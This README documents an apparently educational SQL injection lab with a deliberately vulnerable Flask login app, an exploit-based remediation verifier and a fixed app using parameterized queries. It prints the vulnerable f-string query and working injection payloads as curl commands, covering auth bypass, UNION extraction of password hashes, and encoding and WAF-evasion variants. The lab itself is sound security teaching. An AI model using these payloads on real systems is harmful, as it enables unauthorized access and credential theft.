# FIND-0042 — SQL Injection Remediation Verification

> A hands-on demonstration of SQL injection exploitation and remediation verification, built as part of a security automation challenge. Includes a deliberately vulnerable Flask app, a working exploit script, and a fixed app — showing the full attack → verify → fix → re-verify pipeline.

---

## Project Structure

```
challenge/
├── db/
│── seed.py           # Creates SQLite DB and seeds 10 users
│── users.db          # Generated database (after running seed.py)
├── app.py                # VULNERABLE Flask app — raw string interpolation
├── app_fixed.py          # FIXED Flask app — parameterized queries
├── exploit.py            # Automated SQLi verification script (9 test cases)
├── report_5000_*.json    # Evidence report — vulnerable app run
└── report_5001_*.json    # Evidence report — fixed app run
```

---

## The Vulnerability

**Finding ID:** FIND-0042  
**Type:** SQL Injection  
**Endpoint:** `POST /api/v1/login`  
**Parameter:** `username`  
**DB Engine:** SQLite (mirrors MySQL 8.0 behavior for demo purposes)  

### Vulnerable Code (`app.py`)

```python
# RAW STRING INTERPOLATION — attacker controls the WHERE clause
query = f"SELECT id, username, role, email FROM users WHERE username = '{username}' AND password = '{hash_password(password)}'"
cursor.execute(query)
```

### Fixed Code (`app_fixed.py`)

```python
# PARAMETERIZED QUERY — username bound as value, never interpolated
query = "SELECT id, username, role, email FROM users WHERE username = ? AND password = ?"
cursor.execute(query, (username, hash_password(password)))
```

One line change. Structurally eliminates the entire injection surface.

---

## Requirements

```bash
pip install flask requests
python --version  # Python 3.10+ recommended
```

---

## Setup

### 1. Clone and enter the project

```bash
git clone <your-repo-url>
cd challenge
```

### 2. Seed the database

```bash
python db/seed.py
```

Expected output:
```
[+] Database seeded at /path/to/db/users.db
[+] 10 users created

Users:
  admin                password: password
  alice.jones          password: Passw0rd!
  bob.smith            password: qwerty2024
  ...
```

---

## Steps to Reproduce

### Step 1 — Run the vulnerable app

```bash
python app.py
```

```
[!] WARNING: Running VULNERABLE app on port 5000
 * Running on http://127.0.0.1:5000
```

---

### Step 2 — Manual exploitation (optional)

Open a second terminal and test manually:

```bash
# Normal login — works as expected
curl -X POST http://localhost:5000/api/v1/login \
  --data-urlencode "username=admin" \
  --data-urlencode "password=superSecret123"

# Classic auth bypass — returns all users without valid credentials
curl -X POST http://localhost:5000/api/v1/login \
  --data-urlencode "username=' OR '1'='1' OR '1'='1" \
  --data-urlencode "password=anything"

# UNION-based extraction — dumps all usernames and password hashes
curl -X POST http://localhost:5000/api/v1/login \
  --data-urlencode "username=' UNION SELECT 1,group_concat(username||':'||password),3,4 FROM users-- -" \
  --data-urlencode "password=x"

# Encoding bypass — no quotes used, bypasses quote sanitizers
curl -X POST http://localhost:5000/api/v1/login \
  --data-urlencode "username=' UNION SELECT 1,hex(password),3,4 FROM users WHERE username=char(97,100,109,105,110)-- -" \
  --data-urlencode "password=x"

# WAF bypass — inline comment obfuscation breaks WAF keyword signatures
curl -X POST http://localhost:5000/api/v1/login \
  --data-urlencode "username=' UN/**/ION SE/**/LECT 1,group_concat(username),3,4 FROM users-- -" \
  --data-urlencode "password=x"
```

---

### Step 3 — Run automated exploit against vulnerable app

```bash
python exploit.py
```

Expected output:
```
=======================================================
  REMEDIATION VERIFICATION — VULNERABLE APP
  Finding  : FIND-0042 | sql_injection
  Target   : http://localhost:5000/api/v1/login
=======================================================

[TC-01] Classic Auth Bypass        → FAIL — status_deviation, hash_deviation
[TC-02a] Blind Boolean (True)      → FAIL — status_deviation, hash_deviation
[TC-02b] Blind Boolean (False)     → PASS
[TC-03] Time-Based Blind           → FAIL — status_deviation, hash_deviation
[TC-04] Error-Based                → PASS  (SQLite limitation — see notes)
[TC-05] Encoding Bypass            → FAIL — status_deviation, hash_deviation
[TC-06] Second-Order               → FAIL — status_deviation, hash_deviation
[TC-07] WAF Bypass                 → FAIL — status_deviation, hash_deviation
[TC-08] Input Sanitization Specific→ FAIL — status_deviation, hash_deviation

  VERDICT: REMEDIATION FAILED ✗
  Failed  : 7 / 9
```

---

### Step 4 — Run the fixed app

Open a third terminal:

```bash
python app_fixed.py
```

```
[+] Running FIXED app on port 5001
 * Running on http://127.0.0.1:5001
```

---

### Step 5 — Re-run same exploit against fixed app

```bash
python exploit.py --port 5001 --fixed
```

Expected output:
```
=======================================================
  REMEDIATION VERIFICATION — FIXED APP
  Finding  : FIND-0042 | sql_injection
  Target   : http://localhost:5001/api/v1/login
=======================================================

[TC-01] Classic Auth Bypass         → PASS
[TC-02a] Blind Boolean (True)       → PASS
[TC-02b] Blind Boolean (False)      → PASS
[TC-03] Time-Based Blind            → PASS
[TC-04] Error-Based                 → PASS
[TC-05] Encoding Bypass             → PASS
[TC-06] Second-Order                → PASS
[TC-07] WAF Bypass                  → PASS
[TC-08] Input Sanitization Specific → PASS

  VERDICT: REMEDIATION SUCCESSFUL ✓
  Failed  : 0 / 9
```

---

## Test Case Coverage

| Test ID | Category | Technique | Targets Sanitization Claim |
|---------|----------|-----------|---------------------------|
| TC-01 | Classic Auth Bypass | OR-based tautology | ✓ |
| TC-02a | Blind Boolean (True) | Differential response | ✓ |
| TC-02b | Blind Boolean (False) | Differential response | ✓ |
| TC-03 | Time-Based Blind | Heavy computation delay | |
| TC-04 | Error-Based | CAST type mismatch | |
| TC-05 | Encoding Bypass | hex() + char() — zero quotes | ✓ |
| TC-06 | Second-Order | Stored payload reuse | ✓ |
| TC-07 | WAF Bypass | Inline comment obfuscation | ✓ |
| TC-08 | Input Sanitization Specific | UNION extraction | ✓ |

---

## Anomaly Detection Logic

The exploit script flags three anomaly types per request:

| Anomaly | Detection Method |
|---------|-----------------|
| `status_deviation` | Response status differs from baseline status |
| `timing_anomaly` | Adjusted response time exceeds 4.0s threshold |
| `hash_deviation` | SHA-256 of response body differs from baseline hash |

Baseline is computed dynamically at runtime (two clean requests, averaged) — not hardcoded.

---

## Evidence Reports

Each run produces a timestamped JSON report with SHA-256 integrity hash:

```
report_5000_20260317_020820.json   ← vulnerable app run
report_5001_20260317_022409.json   ← fixed app run
```

```bash
# Verify report integrity
sha256sum report_5000_*.json
sha256sum report_5001_*.json
```

---

## Known Limitations

| Limitation | Reason | Real-World Equivalent |
|------------|--------|-----------------------|
| TC-04 Error-Based passes on vulnerable app | SQLite silently returns NULL on failed CAST instead of raising an error | On MySQL 8.0, `EXTRACTVALUE()` raises a hard error — TC-04 would FAIL as expected |
| TC-03 timing payload uses `randomblob()` | SQLite has no `SLEEP()` function | On MySQL 8.0, `SLEEP(5)` triggers a clean timing anomaly |

---

## Why Parameterized Queries Fix This

Input sanitization (quote escaping, stripping) operates on the **data** after it has already been interpolated into the query string. An attacker only needs to find one encoding, character set, or syntax variant the sanitizer missed.

Parameterized queries separate **query structure** from **data** at the protocol level. The database engine parses the SQL first, then binds the parameter as a typed value. There is no stage at which user input is interpreted as SQL syntax — regardless of what it contains.

```
Sanitization:  "We cleaned the bad stuff out"     → depends on catching everything
Parameterization: "Data cannot become code"        → structurally impossible to inject
```

---

## Disclaimer

This project is built for educational and security research purposes only.  
The vulnerable app is intentionally insecure — **do not deploy it in any environment.**